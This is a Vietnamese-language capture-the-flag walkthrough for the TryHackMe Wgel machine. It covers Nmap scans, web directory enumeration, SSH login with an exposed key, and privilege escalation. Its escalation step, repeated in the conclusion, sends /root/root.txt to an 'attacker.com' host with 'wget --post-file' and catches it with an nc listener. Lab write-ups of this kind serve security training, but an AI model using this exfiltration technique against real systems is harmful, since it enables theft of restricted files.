TryHackMe - Wgel CTF Writeup  
Tools used:
Nmap
1.Dirsearch
2.Gobuster
3.GTFOBins
Scanning and Enumeration  

**LƯU Ý:** Địa chỉ IP của máy sẽ được biểu diễn là `10.10.x.x` vì TryHackMe cấp IP khác nhau cho từng người dùng.  

Giả sử bạn đã có IP của máy, hãy chạy **4 lệnh Nmap** để quét và thu thập thông tin hệ thống.  

Half TCP Scan (Quét TCP một nửa bắt tay)
```
nmap -n -sS -vv -T5 -p 1-20000 10.10.x.x -oN Half-TCP.txt
```
Quét phiên bản / Banner Grabbing  
Sử dụng Nmap để lấy thông tin phiên bản dịch vụ chạy trên các cổng.  
```
nmap -sV --version-all -vv -T5 -p 22,80 10.10.x.x -oN Version-scan.txt
```
Aggressive Scan  
Thực hiện quét nâng cao (Aggressive Scan) để vừa thu thập service, version vừa chạy các script cơ bản.  
```
nmap -A -vv -T5 10.10.x.x -oN Aggressive-scan.txt
```
Nmap NSE Vulnerability Scan  
Dùng Nmap với các script NSE để phát hiện lỗ hổng của dịch vụ trên port. 
```
nmap --script vuln -p 80 10.10.x.x -oN nse-vuln.txt
```
Điểm quan trọng ở đây chính là **Half TCP Scan** và **NSE Scan**:  
- Với **Half TCP Scan**, bạn sẽ biết được bao nhiêu port đang mở.  
- Với **NSE Scan**, bạn sẽ có được một “phác thảo” sơ bộ về những lỗ hổng mà port/dịch vụ đó có thể tồn tại.

Enumeration Website  

Từ đây, bên ngoài hệ thống không còn gì nhiều để khai thác.  
Chuyển trọng tâm sang website chạy trên **port 80**.  


Khi truy cập website, bạn sẽ thấy trang mặc định Apache2 Ubuntu.  
Hãy bỏ qua trang đó và bắt đầu enumerate website ngay.  


Bạn có thể dùng **Dirsearch** hoặc **Gobuster** (mình hay dùng Gobuster).  

Dirsearch
```
dirsearch -u http://10.10.x.x/ -t 120
```
Gobuster
```
gobuster dir -u http://10.10.x.x/ -x /path/to/wordlist/ -X /path/to/extension/wordlist -t 120
```
Lý do mình để danh sách extension trong file riêng là để chắc chắn không bỏ sót loại file nào.

Sau khi enumerate, thư mục duy nhất bạn thấy được truy cập là: http://10.10.x.x/sitemap/
Truy cập vào đó, bạn sẽ thấy một trang web.  

Quay lại bước đầu tiên, bạn nên tiếp tục enumerate website bằng **Dirsearch** hoặc **Gobuster** để tìm các file và thư mục có thể truy cập.  
Trong lúc chạy Dirsearch hoặc Gobuster, hãy kiểm tra **source code HTML** của `http://10.10.x.x/sitemap/` vì trong đó có chứa **một username**.  
Sau khi hoàn thành quét với Dirsearch hoặc Gobuster, bạn sẽ tìm thấy thư mục: /.ssh/
Lưu file trong đó và dùng nó để đăng nhập SSH.  


SSH login và Leo thang đặc quyền  

Sau khi đăng nhập thành công qua SSH, hãy lấy ngay **user flag** (thường nằm ở thư mục `/Documents/`).  

Privilege Escalation 
Nếu bạn chạy lệnh: 
```
sudo -l
```
Bạn sẽ thấy rằng user được phép chạy wget với đặc quyền cao.
Khai thác (Privilege Escalation)

Để khai thác, chạy lệnh sau:
```
URL=http://attacker.com/
LFILE=file_to_send
wget --post-file=$LFILE $URL
```
--post-file : tuỳ chọn này sẽ gửi toàn bộ nội dung file (ví dụ: /root/root.txt) đến địa chỉ IP + port bạn chỉ định thông qua HTTP POST request.

LFILE : thay bằng đường dẫn của file mà bạn muốn đọc.

URL : thay bằng địa chỉ IP và port của máy tấn công (nơi bạn mở listener).


Trên máy tấn công (Kali)
Mở listener để chờ dữ liệu:
```
nc -lvnp 9999
```
```
ncat -lvnp 9999
```
Sau khi thiết lập listener, nhấn Enter và bạn sẽ thấy **root flag** được gửi về máy tấn công.  

Kết luận  

Nếu có điều gì chúng ta học được hôm nay, thì đó là:  
Ta có thể đọc và gửi nội dung của một file về máy của mình thông qua **HTTP POST request** bằng cách sử dụng lệnh:  
```
URL=http://attacker.com/
LFILE=file_to_send
wget --post-file=$LFILE $URL
```
Chúng ta không thực sự leo thang đặc quyền bằng `wget`, tuy nhiên chúng ta đã **lợi dụng/abuse quyền SUID** để đọc được nội dung của các file bị hạn chế.  
